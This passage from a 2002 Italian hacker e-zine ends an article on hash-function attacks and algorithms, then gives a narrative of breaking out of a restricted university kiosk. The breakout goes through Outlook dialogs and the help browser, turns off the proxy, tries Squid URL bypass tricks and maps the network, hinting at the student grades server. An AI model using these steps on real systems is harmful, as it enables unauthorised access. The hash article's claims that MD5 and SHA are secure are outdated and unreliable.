|                                                                          | 
|                                                                          | 
| [Crittanalisi Lineare]                                                   | 
|                                                                          | 
| La crittanalisi lineare ha avuto grossi successi soprattutto contro i    | 
| cifrari a blocchi, ma al momento non ha trovato utilita' nell'attacco    | 
| alle funzioni hash. Si sospetta pero' che le funzioni hash basate sui    | 
| cifrari a blocchi siano estremamente vulnerabili a questo tipo di        | 
| attacco.                                                                 | 
|                                                                          | 
|                                                                          | 
| ================================                                         | 
| *** ATTACCHI AD ALTO LIVELLO ***                                         | 
| ================================                                         | 
|                                                                          | 
| [Replay Attack]                                                          | 
|                                                                          | 
| O "Restore Attack", uno dei piu' conosciuti. In pratica qui l'attacker   | 
| non cerca assolutamente di alterare il messaggio, ma lo intercetta e lo  | 
| ritrasmette di nuovo in un secondo momento. Nel caso ad esempio di una   | 
| banca che trasmette ad un'altra banca informazioni su un versamento      | 
| effettuato, questo metodo potrebbe far guadagnare un mucchio di soldi.   | 
| In pratica l'attacker fa cosi': si reca alla banca X, dove ha un conto   | 
| corrente, e sposta poche decine di Euro su un altro conto corrente,      | 
| sempre suo, alla banca Y. La banca X inviera' un messaggio alla banca Y  | 
| dicendogli: "Guarda, ti sto trasferendo 50Ç sul cc. n░########. Firmato: | 
| Banca X" (la banca X firma il messaggio con la sua chiave privata per    | 
| dimostrare alla banca Y la validita' dell'operazione). L'attacker        | 
| intercetta questo messaggio. A causa della firma digitale gli sarebbe    | 
| impossibile forgiare un messaggio da zero e spedirlo alla banca Y        | 
| spacciandosi per la banca X, ma il messaggio che ha in mano ora e'       | 
| autentico con tanto di firma. Quindi non deve fare altro che             | 
| rispedirglielo (magari un sacco di volte), guadagnando cosi' 50Ç per     | 
| volta a sbafo.                                                           | 
| Per difendersi da questo attacco e' sufficente inserire nel corpo del    | 
| messaggio una parte che contiene data e ora precise dell'invio, quindi   | 
| calcolare l'hash con una keyed hash function tramite una session-key     | 
| condivisa dalle due banche e allegare tale hash al messaggio (oppure     | 
| calcolare il solo message digest e firmarlo con la propria chiave        | 
| privata, o qualsiasi sistema analogo). Questa parte che contiene data e  | 
| ora e' chiamata TIMESTAMP, e per utilizzarla e' necessario che           | 
| l'orologio di tutte le banche sia in perfetta sincronia (difatti le      | 
| banche di solito sono sincronizzate via satellite sull'orologio atomico  | 
| di Greenwich. Almeno credo...).                                          | 
|                                                                          | 
|                                                                          | 
| [Padding Attack]                                                         | 
|                                                                          | 
| Questo attacco e' attuabile se si usa come keyed hash function una       | 
| funzione hash che in realta' NON LO E', semplicemente usando la chiave   | 
| come IV. L'attaccante puo' intercettare la coppia hash-messaggio         | 
| autentica, prependere (il contario di "appendere" ;)) del testo al       | 
| messaggio, ricalcolare l'hash e rispedire il messaggio senza che nessuno | 
| si accorga di niente. Comunque per evitare questo attacco ci sono tanti  | 
| modi, il piu' semplice dei quali consiste nell'inserire l'header con la  | 
| lunghezza del messaggio.                                                 | 
|                                                                          | 
|                                                                          | 
| Purtroppo si e' fatto tardi e non faccio in tempo a descrivere           | 
| dettagliatamente il funzionamento degli algoritmi di hashing, ne daro'   | 
| comunque una breve panoramica. Per un buon documento introduttivo alle   | 
| funzioni hash (comprende anche descrizione dettagliata di MD2, MD4, MD5  | 
| e SHA) vi rimando a:                                                     | 
|                                                                          | 
|    S. Bakhtiari, R. Safavi-Naini, J. Pieprzyk:                           | 
|    *** Criptographic Hash Functions: A Survey ***                        | 
|    Centre for Computer Security Research, University of Wollongong,      | 
|    Australia.                                                            | 
|                                                                          | 
|                                                                          | 
|                                                                          | 
|                                                                          | 
| ===========                                                              | 
| *** MD2 ***                                                              | 
| ===========                                                              | 
|                                                                          | 
| Tutte le funzioni hash MDx (Message Digest x) sono dell'RSA Security     | 
| Inc. L'algoritmo MD2 e' uno dei primi nati e genera checksum di 128 bit  | 
| a partire da messaggi di lunghezza arbitraria. E' considerato insicuro   | 
| ed e' tra i piu' lenti in assoluto.                                      | 
|                                                                          | 
|                                                                          | 
|                                                                          | 
| ===========                                                              | 
| *** MD4 ***                                                              | 
| ===========                                                              | 
|                                                                          | 
| Altro algoritmo made in RSA, che usa una struttura a 32 bit molto        | 
| semplice (progettata per processori a 32 bit). Genera hash a 128 bit,    | 
| usa 15 round ed e' uno degli algoritmi di hashing piu' veloci in         | 
| assoluto. Sono stati portati a segno alcuni attacchi contro round        | 
| specifici o singole funzioni dell'MD4, ma per il momento non ci sono     | 
| attacchi efficaci conosciuti contro l'intero algoritmo.                  | 
|                                                                          | 
|                                                                          | 
|                                                                          | 
| ===========                                                              | 
| *** MD5 ***                                                              | 
| ===========                                                              | 
|                                                                          | 
| L'MD5 e' una versione "rinforzata" dell'MD4. Rispetto all'MD4 aggiunge   | 
| un altro round (da 15 a 16) e nuove operazioni in ogni round, l'hash e'  | 
| sempre di 128 bit ed e' anch'esso velocissimo. Anche nel suo caso        | 
| esistono solo attacchi contro singole parti della funzione, ma l'intero  | 
| algoritmo e' considerato sicuro, probabilmente la sua debolezza sta piu' | 
| nella lunghezza del checksum che nelle falle crittanalitiche (se ne      | 
| esistono). E' l'algoritmo "storicamente" usato dal PGP. Ne esiste anche  | 
| una versione a chiave, che pero' sembra essere molto piu' insicura.      | 
|                                                                          | 
|                                                                          | 
|                                                                          | 
| ===========                                                              | 
| *** SHA ***                                                              | 
| ===========                                                              | 
|                                                                          | 
| SHA (Secure Hash Algorithm) e' un altro derivato dell'MD4, molto piu'    | 
| "robusto" pero': il message digest e' di 160 bit e il numero di round    | 
| passa da 16 a 20. Queste modifiche lo rendono pero' molto piu' lento sia | 
| dell'MD4 che dell'MD5. Non esiste nessun attacco noto contro lo SHA. Le  | 
| ultime versioni del PGP usano anche lo SHA per il protocollo di firma    | 
| digitale DSS.                                                            | 
|                                                                          | 
|                                                                          | 
|                                                                          | 
| Per finire, questa tabella riporta le performance in velocita' di        | 
| diversi algoritmi di hashing (tutti dedicati e non a chiave) su un 16MHz | 
| IBM PS/2:                                                                | 
|                                                                          | 
| Algoritmo      Velocita' (Kbit/s)                                        | 
| =================================                                        | 
| MD2                      78                                              | 
| FFT-hash I              212                                              | 
| N-hash                  266                                              | 
| Snefru-8                270                                              | 
| SHA                     710                                              | 
| BCA                     764                                              | 
| RIPEMD                 1334                                              | 
| MD5                    1849                                              | 
| MD4                    2669                                              | 
|                                                                          | 
|                                                                          | 
|                                                                          | 
| Ufff... e anche questa e' fatta. Diavolo, stavolta l'ho stampato a tempo | 
| di record questo articolo  ;)                                            | 
| Bene, allora anche per stavolta questo e' quanto... Non perdetevi la     | 
| prossima puntata col capitolo della FIRMA DIGITALE (sempre contrattempi  | 
| a parte naturalmente, eheheh...).                                        | 
|                                                                          | 
|                                                                          | 
| Saluti e Paranoia a tutti                                                | 
|  Zer0                                                                    | 
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ SHUTD0WN                                   #08 - 01/11/2002 |
| MEDiTAZi0Ni DAVANTi AD UNA MACCHiNETTA             [Dreadnaut] 0x19/0x1A |
+--------------------------------------------------------------------------+
|  [ Tutto  quanto  scritto  in  questo  testo  e'  a  scopo  puramente    |
|    informativo  e  didattico,  anzi meglio,  non si riferisce  a cose    |
|    o persone  realmente esistenti ma e' frutto  della mia fantasia... ]  |
|                                                                          |
|               -> Meditazioni davanti ad una macchinetta <-               |
|                                                                          |
|  Mi rivolgo agli studenti universitari: a tutti quelli che hanno visto,  |
|  e utilizzato,  le strane macchinette per i certificati...  mistici pc   |
|  dotati (almeno nella mia zona) di                                       |
|                                                                          |
|   a) sistema operativo WinQualcosa                                       |
|      [ quale lo scopriremo piu' tardi :) ]                               |
|   b) browser personalizzato a fullscreen etc etc...                      |
|   c) connessione a un rete                                               |
|      [ locale, wide area o internet lo scopriremo piu'tardi... ]         |
|                                                                          |
|  In effetti  il sistema sembra ben fatto,  serio, e per ogni operazione  |
|  ritenuta `rischiosa' (mail, accesso archivi...) richiede l'inserimento  |
|  del `badge'  (il tesserino  dell'universita'  contenente  il numero di  | 
|  matricola)  con conseguente  identificazione....  male male :)          |
|  Oggi pomeriggio non avevo nulla  da fare e nel mio vagabondare mi sono  |
|  trovato di fronte,  apparsa come dal nulla,  una di queste macchinette  |
|  tentatrici.                                                             |
|  Girellando per il menu `Servizi Studenti` ho notato sulla sinistra una  |
|  scrittina posta,  che avevo sempre snobbato:  gli informatici seri non  |
|  hanno bisogno  di una  webmail universitaria... tze.... ma, non avendo  |
|  nulla da fare, anche questo andava bene...                              |
|  La pagina suddetta  mostrava  le cose ovvie:  attiva la casella, leggi  |
|  posta... ma in basso, un'apparizione:                                   |
|                                                                          |
|          "Mail per il supporto tecnico - segnalazione guasti"            |
|                                                                          |
|                          e le parole magiche:                            |
|                                                                          |
|             - Per Il Servizio Non E' Necessario il Badge -               |
|                                                                          |
|  Del tutto anonimo, a parte le impronte  digitali ho pensato... mi sono  |
|  dato da solo  del paranoico, poi ho iniziato  a scrivere con le nocche  |
|  delle dita... :)  Ok scriviamo al supporto tecnico!                     |
|  Si apre una triste finestrella di Outlook  dove scrivere il messaggio,  |
|  ma non  ho nulla  da scrivere e curioso:  il tasto Allega  mi apre una  |
|  dialog:  il  sistema  alla  mia  Merce'!   ma  il tasto  destro  della  |
|  trackball e' disabilitato (o piu' probabilmente proprio scollegato...)  |
|  e non posso eseguire nulla... sigh... vabbeh, allego l'eseguibile alla  |
|  mail e poi  riclicco sull'icona dell'allegato... e il sistema babbo lo  |
|  esegue. Mmmh non proprio...                                             |
|                                                                          |
|      "Sul sistema sono attivate delle restrinzioni,                      |
|                                 impossibile eseguire l'operazione"       |
|                                                                          |
|  Ok..  Windows NT...  infatti lo stesso effetto  si ottiene con bitmap,  |
|  txt, rtf e tutto il resto... sigh...  l'unica cosa che si puo' fare e'  |
|  creare  cartelle   dalla  finestra   Allega.  All'infinito...  ops  :)  |
|  Che tristezza  direte... e' anche vero,  ma io continuavo  a non avere  |
|  niente da fare e quindi mi son detto... se c'e' Outlook c'e' anche IE!  |
|  Ok come lo trovo ?                                                      |
|                                                                          |
|   Menu' "?"\Microsoft sul Web\&lt;uno dei link>                             |
|                                                                          |
|  mi sembra  la soluzione giusta...  ma niente...  non viene eseguito...  |
|  eppure... sempre nel menu'  dell'help c'e' "Sommario e indice", ottimo  |
|  per avere  l'help di Outlook,  che e'  in formato .chm,  cioe' html :)  |
|  Fico...  ho  un  browser...  ma  non  posso  scegliere  l'indirizzo :\  |
|  Solo che in alto mi dice "Guida sul Web" e poi mi da un link:           |
|                                                                          |
|         "sito Web di Microsoft"         ehheheheh parte IE :)            |
|                                                                          |
|  Ok, ho IE e sono a posto direte... e invece no...  ( che palle neh ? )  |
|  C'e' un proxy,  con su Squid  che mi rompe le palle:  provo i giochini  |
|  tipici per Squid:  la finta query ( "http://sito?&lt;sito visibile>" )  e  |
|  il finto user ("http://&lt;sitovisibile>@sito" ) ma questo e' patchato...  |
|  o e' IE che e' maffo :)   cmq non posso fare niente...                  |
|  Mi dico:  "settaggi internet e tagliamo fuori il proxy" ma magicamente  |
|  sotto il menu' Strumenti di IE  manca l'item "Opzioni Internet..." ...  | 
|  cavolo di NT e utenti... bah                                            |
|  Pero'  sotto Strumenti  c'e' anche  "Posta elettronica e news"  e  poi  |
|  "Leggi posta" che casualmente cosa lancia ?   OutLook, ma questa volta  |
|  la  finestra  principale...  posso  spedire  posta  dove  voglio,  con  | 
|  l'account che voglio (ovvio che ci sono i soliti problemi di relaying)  |
|  Fico, ma non mi interessa piu' di tanto,  oggi sono fissato col proxy.  |
|  OutLook...   mmmh....   Strumenti\Opzioni\Connessione   toh  guarda...  |
|  "CAMBIA"  hiihihi  "Impostazioni Lan"...   casellina  proxy  attivata:  |
|  un click e non lo e' piu'. Ok\Ok\Ok\Ok dopo una mezz'ora sono di nuovo  |
|  su IE e toh guarda non ho piu' problemi di navigazione... mi guardo la  |
|  posta di casa... lei non ha scritto. Ok, tutto perde importanza.        |
|  Con un attimo di professionalita' svuoto cache e cronologia,  riattivo  |
|  il proxy,  chiudo IE, OE e l'help  perche' se li lascio  in background  |
|  dietro il prog principale trasha tutto, cancello tutta la rumenta e le  |
|  cartelle  che ho  creato per  provare e  me ne vado  meditabondo sulla  |
|  desolazione della mia casella vuota... lei non ha scritto.              |
|                                                                          |
|  Non credo  che tutte  le macchinette  d'Italia funzionino  allo stesso  |
|  modo,  non credo  che siano  tutte connesse  a internet  attraverso un  |
|  semplice proxy  _ma_  con  anche un gateway  pronto e gentile... pero'  |
|  nella  mia  zona  si...  e  le  altre  non  possono  funzionare  molto  |
|  diversamente...  chissa  quali ip  hanno, se magari  costituiscono una  |
|  sottorete,  se sono raggiungibili dall'esterno...  ci sono un sacco di  |
|  domande    e    un    sacco    di    macchinette     che    aspettano:  |
|  la prossima volta guardatele con un altro occhio ;)                     |
|                                                                          |
|                                                                          |
|  Epilogo:                                                                |
|                                                                          |
|   Poi piu' tardi lei aveva scritto. Ma io sono ripassato cmq dalla mia   |
|   macchinetta preferita, e dando occhiate sospettose a tutti i placidi   |
|   studenti  che mi passavano accanto,  ho continuato  gli esperimenti:   |
|   ri-disattivo il proxy come sopra, e mando una mail. La controllo dal   |
|   sito corrispondente e mi guardo gli header:  la mail proviene da una   |
|   macchina SSMATH1 - Sportello Studenti Matematica I -  corrisponde :)   |
|   Ok ora ho l'IP del terminale,  130.nnn.etc.etc,  vado su  ripe.net e   |
|   provo a cercare  elementi utili nel db whois.                          |
|                                                                          |
| inetnum:      130.nnn.0.0 - 130.nnn.255.255                              |
| netname:      -ANTANI-NET                                                |
| descr:        Universita' degli Studi di Antani                          |
|                                                                          |
|  La rete  "130.nnn."  e' infatti quella  che `contiene'  le universita'  |
|  della mia citta'.                                                       |
|                                                                          |
| mnt-by:       GARR-LIR                                                   |
|                                                                          |
|  Le universita' italiane  sono (credo) tutte appoggiate  alla rete GARR  |
|  [ "Rete dell'Universitα e della Ricerca Scientifica Italiana", non so'  |
|  in base  a quale  strana regola  per la generazione  di acronimi :) ].  |
|                                                                          |
|  /* Anche Torino ha un range simile:                                     |
|                                                                          |
| inetnum:      130.192.0.0 - 130.192.255.255                              |
| netname:      TORINO-IT-LAN                                              |
| descr:        Politecnico di Torino                                      |
| descr:        CeSIT                                                      |
| remarks:      LANs connecting University departments and                 |
| remarks:      research institutes located in or near Torino              |
| mnt-by:       GARR-LIR                                                   |
|  */                                                                      |
|                                                                          |
|  Apro Google  ( - Dove c'e' Google, c'e' casa - ), cerco  un traceroute  |
|  online e traccio la macchinetta:                                        |
|  Germania (.de), Francia,  poi attraverso la rete di Telia si arriva in  |
|  Italia nei primi 9 (e poco interessanti) hop,  poi iniziano i segmenti  |
|  del Garr: tre ip  193.206.134.xxx  che si rimbalzano fra Milano Roma e  |
|  infine nella mia citta'.                                                |
|                                                                          |
| inetnum:      193.206.0.0 - 193.206.15.255                               |
| netname:      MURST-NET                                                  |
| descr:        Ministero Universita' e della Ricerca\                     |
| Scientifica e Tecnologica                                                |
| country:      IT                                                         |
| remarks:      To notify abuse mailto: cert@garr.it                       |
| remarks:      Ministry for University and Scientific\                    |
|  and Tecnological Research                                               |
| remarks:      GARR - Italian academic and research network               |
| mnt-by:       GARR-LIR                                                   |
|                                                                          |
|  Poi  si passa a  130.nnn.  e con altri  tre hop  siamo nella facolta':  |
|  un host ha persino  il nome della via!  dopo altri 13 hop (!!!) arriva  |
|  finalmente al terminale. Siamo tornati a casa :)                        |
|                                                                          |
|  Come  ultima mossa,  prima della pausa pranzo,  recupero  senza troppe  |
|  difficolta'  la lista delle altre macchinette da una pagina  con tanto  |
|  di CGI  per sapere se sono  accese e mi metto  alla ricerca delle piu'  |
|  vicine.  Da un lato sono fortunato,  perche' ne trovo  ben tre delle 5  |
|  a portata di \piedi\, ma dall'altro... una tristezza...                 |
|  Nessuna,  e ripeto -NESSUNA-,  al tentativo di contattare  il servizio  |
|  guasti, rispondeva  con una finestrella di Outlook:  su tutte il simil  |
|  browser rimaneva li', fornendo solo una textbox per inserire il testo.  |
|  Unico possibile divertimento  per l'utente frustrato,  la possibilita'  |
|  di divertirsi  con la barra  degli strumenti...  ad esempio eliminando  | 
|  qualche pulsante essenziale (tipo Esci ?).                              |
|  Cmq  niente  OE,  quindi  niente  IE,   quindi  niente  navigazione...  |
|  Ultima cosa triste e poi finisco:  il simil-browser  non sembra essere  |
|  influenzato  dai settaggi del proxy  di IE (mica scemo)  quindi non e'  |
|  cosi' facile  tentare di scoprire  la macchina che contiene l'archivio  |
|  degli studenti e dei voti ;)                                            |
|                                                                          |
|  saluti,                                                                 |
|   Dreadnaut                                                              |
|                                    - dreadnaut &lt;at> libero &lt;dot> it -    |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+  
| ONDAQUADRA ~ C0NTATTi                                   #08 - 01/11/2002 |   
| D0VE TR0VARCi                                       [oq~staff] 0x1A/0x1A |   
+--------------------------------------------------------------------------+   
|                                                                          |   
| WEB:                                                                     |   
| http://www.ondaquadra.org                                                |   
|                                                                          |   
| MAiL:                                                                    |   
| mail@ondaquadra.org                                                      |   
|                                                                          |   
| GLi ARTiC0Li MANDATELi QUi:                                              |   
| articoli@ondaquadra.org                                                  |   
|                                                                          |
| PER SEGNALARE ABUSi SCRiVETE QUi:                                        |
| abuse@ondaquadra.org                                                     |
|                                                                          |   
| iRC - iNTERNET RELAY CHAT:                                               |   
| /server irc.azzurra.org 6667                                             |   
| /join #ondaquadra                                                        |   
| /join #hackmaniaci                                                       |   
|                                                                          |   
|                                                                          |   
+--------------------------------------------------------------------------+
```

</div>
